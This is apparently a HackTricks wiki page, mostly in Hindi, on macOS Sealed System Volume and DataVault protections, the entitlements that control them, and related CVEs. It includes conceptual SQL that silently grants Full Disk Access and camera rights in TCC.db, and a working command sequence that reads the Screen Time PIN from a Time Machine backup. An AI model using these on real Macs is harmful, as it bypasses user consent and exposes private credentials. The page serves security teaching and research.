# macOS Sealed System Volume & DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Sealed System Volume (SSV)

### Basic Information

**macOS Big Sur (11.0)** से शुरू होकर, system volume को **APFS snapshot hash tree** का उपयोग करके cryptographically seal किया जाता है। इसे **Sealed System Volume (SSV)** कहा जाता है। System partition को **read-only** mount किया जाता है और कोई भी modification seal को तोड़ देता है, जिसे boot के दौरान verify किया जाता है।<sup>[[11]](#references)</sup>

SSV निम्नलिखित सुरक्षा प्रदान करता है:
- **Tamper detection** — system binaries/frameworks में कोई भी modification Merkle-tree root को बदल देता है और Apple-signed seal को invalid कर देता है
- **Boot-time authentication** — boot chain selected system snapshot को root filesystem बनने से पहले verify करती है
- **Rootkit resistance** — authenticated root को disable किए बिना या authorized update path से समझौता किए बिना, root भी authenticated system snapshot में files को persistently replace नहीं कर सकता

SSV **System** volume को protect करता है, न कि उससे paired writable **Data** volume को। Firmlinks दोनों volumes को `/` पर दिखाई देने वाले namespace में merge करते हैं, इसलिए writable दिखने वाला path यह सिद्ध नहीं करता कि underlying object sealed snapshot से संबंधित है। FileVault और Data Protection at-rest data की confidentiality को cover करते हैं; वे SSV integrity से अलग हैं।<sup>[[11]](#references)</sup>

### Checking SSV Status
```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / "

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```
### प्रभावी system view: SSV + Cryptex grafts

हाल के macOS releases में, `/System` के नीचे दिखाई देने वाला हर executable आवश्यक रूप से booted SSV snapshot से नहीं आता। **Cryptexes** अलग से authenticated APFS disk images होते हैं, जिनका content चुनी हुई directories पर graft किया जाता है; इसलिए Rapid Security Responses base SSV को फिर से बनाए बिना security-sensitive components को replace कर सकते हैं। Persistence की triage या system code का diff करते समय, केवल base snapshot को hash करने के बजाय live mounts और Preboot Cryptex store की inventory बनाएं:
```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```
boot-chain और Rapid Security Response का विवरण [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses) में दिया गया है; यह section स्वयं SSV boundary पर केंद्रित है।

### SSV Writer Entitlements

कुछ Apple system binaries में ऐसे entitlements होते हैं, जो उन्हें sealed system volume को modify या manage करने की अनुमति देते हैं:

| Entitlement | Purpose |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | system volume को पिछले snapshot पर revert करना |
| `com.apple.private.apfs.create-sealed-snapshot` | system updates के बाद नया sealed snapshot बनाना |
| `com.apple.rootless.install.heritable` | SIP-protected paths में write करना (child processes द्वारा inherit किया जाता है) |
| `com.apple.rootless.install` | SIP-protected paths में write करना |

### SSV Writers को ढूँढना
```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```
### Attack Scenarios

#### Snapshot Rollback Attack

यदि कोई attacker `com.apple.private.apfs.revert-to-snapshot` वाले binary को compromise कर लेता है, तो वह **system volume को update से पहले की स्थिति में roll back कर सकता है**, जिससे ज्ञात vulnerabilities फिर से restore हो जाती हैं:
```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```
> [!WARNING]
> Snapshot rollback प्रभावी रूप से **security updates को undo करता है**, जिससे पहले से patched kernel और system vulnerabilities वापस restore हो जाती हैं। यह modern macOS पर संभव सबसे खतरनाक operations में से एक है।

#### System Binary Replacement

SIP bypass + SSV write capability के साथ, attacker:

1. system volume को read-write के रूप में mount कर सकता है
2. किसी system daemon या framework library को trojaned version से replace कर सकता है
3. snapshot को फिर से seal कर सकता है (या यदि SIP पहले से degraded है, तो broken seal को स्वीकार कर सकता है)
4. rootkit reboots के बाद भी persist करता है और userland detection tools के लिए invisible रहता है

### वास्तविक-world CVEs

| CVE | Description |
|---|---|
| CVE-2021-30892 | **Shrootless** — `system_installd` के `com.apple.rootless.install.heritable` entitlement का abuse करके arbitrary post-install scripts चलाने वाला SIP bypass ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | SIP bypass: `system_installd` ने post-install script को `/tmp` के अंदर SIP-protected folder में stage किया, लेकिन `/tmp` स्वयं SIP-protected नहीं है, इसलिए उसके ऊपर image mount करके folder को swap किया जा सकता था ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — XNU में copy-on-write race, जो read-only root-owned files में writes की अनुमति देता है ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Basic Information

**DataVault** sensitive files और directories के लिए entitlement-gated filesystem protection है। BSD flag `UF_DATAVAULT` (`0x00000080`) किसी object को ऐसा चिह्नित करता है जिसके लिए reading और writing दोनों हेतु entitlement आवश्यक है; सामान्य DAC के विपरीत, protection लागू रहने पर केवल **root** बन जाना या Full Disk Access प्राप्त कर लेना उस check को satisfy नहीं करता।<sup>[[4]](#references)[[13]](#references)</sup>

हर protected database के synonym के रूप में “DataVault” का उपयोग न करें। TCC databases, TCC/FDA और SIP-specific policy द्वारा governed होते हैं (देखें [macOS TCC](macos-tcc/README.md)), जबकि keychain item access Keychain ACLs और cryptographic protection पर भी निर्भर करता है (देखें [macOS Keychain](../../macos-red-teaming/macos-keychain.md))। वास्तविक DataVault examples आमतौर पर `/private/var/folders/.../0/` के नीचे service-owned stores के रूप में दिखाई देते हैं, जैसे Screen Time store; जब parent को stat किया जा सकता है, तब BSD file flags में flag `datavault` के रूप में दिखाई देता है।

### DataVault Controller Entitlements

| Entitlement | Boundary |
|---|---|
| `com.apple.rootless.datavault.controller` | `UF_DATAVAULT` objects को access/manage करना<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | TCC decisions को manage करना; यह संबंधित लेकिन अलग privacy boundary है |
| `com.apple.private.tcc.allow` | Entitlement value में नामित selected TCC services को bypass करना |
| `com.apple.rootless.storage.TCC` | SIP-protected TCC store में write करना |

जो process DataVault-controller entitlement को FDA, backup, indexing या IPC functionality के साथ combine करता है, वह विशेष रूप से interesting है: ऐसे confused-deputy primitive की तलाश करें जो vault को सीधे open करने के बजाय protected object को ordinary path पर copy करता हो।<sup>[[14]](#references)</sup>

### DataVault Controllers ढूँढना
```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```
### आक्रमण परिदृश्य

#### Direct TCC Database Modification (अलग TCC boundary)

यदि कोई attacker किसी TCC manager process से समझौता कर लेता है (उदाहरण के लिए, `com.apple.private.tcc.manager` वाले process में code injection के माध्यम से), तो वह **किसी भी application को कोई भी TCC permission देने के लिए TCC database में सीधे बदलाव कर सकता है**:<sup>[[12]](#references)</sup>
```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```
> [!CAUTION]
> TCC database modification **ultimate privacy bypass** है — यह बिना किसी user prompt या दिखाई देने वाले indicator के किसी भी permission को चुपचाप grant कर देता है। ऐतिहासिक रूप से, कई macOS privilege escalation chains का अंतिम payload TCC database writes रहा है।

#### Keychain Database Access

किसी keychain backing database तक raw access, plaintext secret access के बराबर नहीं होता। यदि कोई अन्य privilege boundary attacker को database copy करने देती है, तो key material और item ACLs पर अभी भी attack करना होगा; live DataVault-controller entitlement को पर्याप्त मानने के बजाय dedicated [macOS Keychain](../../macos-red-teaming/macos-keychain.md) page देखें।

#### Backup-copy boundary: Time Machine

2026 के एक analysis ने एक उपयोगी general pattern प्रदर्शित किया: `backupd` के पास `com.apple.rootless.datavault.controller` और Full Disk Access दोनों होते हैं, ताकि वह protected stores को copy कर सके। Tested configuration में, `/private/var/folders` Time Machine में शामिल था और mounted backup copy live DataVault boundary लागू नहीं करती थी। Researcher ने इसका उपयोग Screen Time SQLite store का पता लगाने और live vault खोले बिना उसका plaintext restrictions PIN पढ़ने के लिए किया। इसे **copy-boundary attack** मानें: ऐसे backup, export, migration, indexing और diagnostic deputies की enumeration करें जो vault data को किसी कमजोर mount या path के अंतर्गत materialize कर सकते हैं।<sup>[[13]](#references)[[14]](#references)</sup>
```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```
यह व्यवहार version और backup-layout पर निर्भर करता है। इसे target build पर validate करें, और याद रखें कि encrypted Time Machine destination copy को केवल locked रहने तक ही सुरक्षित रखता है; एक बार mount होने के बाद, उसके access controls attack surface का हिस्सा बन जाते हैं।

### DataVault/TCC Bypass से जुड़े वास्तविक CVEs

| CVE | विवरण |
|---|---|
| CVE-2024-44131 | FileProvider symlink race, जिससे कोई privileged helper TCC-protected data तक पहुंच सकता है ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | root के रूप में, **ऐसा नया user बनाना जिसका `NFSHomeDirectory` attacker-controlled `TCC.db` की ओर point करता हो**; login पर `tccd` इसे consume करता है और grants लागू हो जाते हैं, जिससे अन्य users के data तक पहुंच मिलती है ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | "powerdir": attacker-controlled TCC.db plant करने के लिए user की home dir बदलना ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Bundle-conclusion flaw, जिससे कोई app बिना prompt के **donor bundle के TCC grants inherit** कर सकता है; इसे wild में **XCSSET** द्वारा desktop का screenshot लेने के लिए exploit किया गया ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd` ने `$HOME` से DB path बनाया, इसलिए `launchctl setenv HOME` इसे attacker-controlled `TCC.db` की ओर redirect कर सकता था ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod` के पास `com.apple.private.tcc.manager` **था** और library validation **disabled** थी, इसलिए `/Library/Audio/Plug-Ins/HAL` में रखा गया HAL plug-in arbitrary TCC rights grant कर सकता था ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft finds new macOS vulnerability, Shrootless, that could bypass System Integrity Protection](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Technical Analysis: CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/)
- [4] [Apple Platform Security — Data Protection](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - Uncovering macOS Malware: Bypassing TCC](https://blog.kandji.io/malware-bypass-tcc)
- [7] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [The Nightmare of Apple OTA Updates (APFS Snapshots)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [How to bypass your own Screen Time passcode — source and Time Machine/DataVault analysis](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
